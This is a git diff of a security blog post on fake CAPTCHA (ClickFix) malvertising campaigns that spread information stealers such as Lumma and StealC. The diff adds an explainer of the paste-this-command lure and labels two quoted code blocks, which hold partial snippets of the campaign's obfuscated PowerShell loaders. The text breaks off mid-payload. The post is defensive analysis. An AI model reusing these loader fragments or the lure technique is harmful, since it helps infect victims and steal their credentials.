@@ -1,11 +1,15 @@
 ---
-title: "Fake CAPTCHAs: How Attackers Are Using Them to Spread Malware"
+title: "Fake CAPTCHAs: How Attackers Use Them to Spread Malware"
 date: 2025-05-02 00:00:00 +0800
-categories: [Articles]
+categories: [Articles, "Trail of Breadcrumbs"]
 tags: [Cyber Stuff]
 description: "A breakdown of fake CAPTCHA malvertising campaigns used to deliver malware and information stealers like LummaStealer and StealC with a look at attack flows, findings, detection ideas to put in place, and response actions."
 published: true
 ---
+
+## What is FakeCaptcha / ClickFix?
+
+FakeCaptcha (also known as ClickFix) is a social engineering technique where attackers show victims a fake "prove you're human" verification page. Instead of asking users to click images or solve a puzzle like a real CAPTCHA, the page tells them to copy a command and paste it into the Windows Run dialog or terminal to "verify" they're not a bot. In reality, that command downloads and runs malware, no exploit needed, just the victim following the instructions themselves.
 
 Over the past 4 months within 2025, there has been a sharp rise in cybercriminals using fake CAPTCHA pages as a social engineering tactic to distribute malware, particularly information stealers like Lumma.
 
@@ -25,7 +29,7 @@ Two related commands were identified containing heavily obfuscated PowerShell. A
 
 The scripts used several layers of obfuscation, including arithmetic-based string generation, encoded payloads, compressed data blobs, and indirect execution with reflection. Snippets of these scripts are shown below.
 
-```
+```powershell
 $xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((-838+(6369-(3626436/(-2638+3300)))),(349908/6729),(7048-6991),(10121-(900+(2956+6215))),(-4013+(2422+(-6051+(9845-2147)))),(532+((5201+(786+3650))-(2137+2278)))
  (2922+(2573-(1475+1339))),(-5864+((9875+8932)-(4329+8423))),(-1996+((4710+(-784+2648))-(6350-3682))),(-5618+((7544+(7047-2510))-(2138+1659))),((1639+(3292+8043))-(5087+8771)),(4375/(2912+3064)),(9883-(2881+6900)),(3576+(-652+3974))),(112 + 
 (8322 - 5406))(-4209+(1092+(-3370+6338))),((8259-5850)+(6575-1883)),(-8787+(3680+(-4525+6980))),(-3309+(1217+(-4904+2088)))((7980-5129)+(4630-3491)),(4293-(6694-6160)),((3389+3554)-(2790+7140)),(-8537+(8097+(-4310+6205))),((9022-3662)+(1688+4492)),
@@ -33,7 +37,7 @@ $xtrvndwblhkco=$executioncontext;$atedatatedesantionisaraloralenes = (-joIn (@((
 [byte[]]::ConvertFromBase64String((($vwds = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("..."))) )))
 ```
 
-```
+```powershell
 [System.Text.Encoding]::ascii.(([char[]]@((4326-(25704455/(977+(6670-1606)) -join ''))((h8ndqpv76xz1jykoi20bgu3wt9e "Leo+cWlwdGpzZZqua+5qlhj220k3mpZUAhd5/2a/
 w0Vl7TOF0T3zd4v7VFrzBX84JejSIapRMQCOik7rmLLS4XszXeRT7fSs27LpI5xeIb/oG8WczxrdsIq7z434WoxPxJONCjavyZaBpJziRQ9rzdPIg4iNtNLmSfZ53kYuKRUJjsLowcZhLjROzBKPqNTeJRa4jh8ByZSM1ghpDBjAk5OSnsWgguAarP7rT5eslwRomsHJx5Ld+k7HixAKkN
 /csU4IioWZsd2wGg4rSWxbTI9GlvgMb1BSjV6YVL/J4L7RmyVyqCqq1JrnTQ2YGAzzriJr/sy3xHSkLctb0tpHx9mmbIDum87Ig9bviMTkEkZUCYLDVr4YFMe3bLB/DvkMyxrQJf+TuCGWvM17+NSbWPza69zrnF6eAfToqn8zrjXhPcP3LdLQ1P8sgKfrYjjsQHjsMaIc87+GK0pTjMtLi
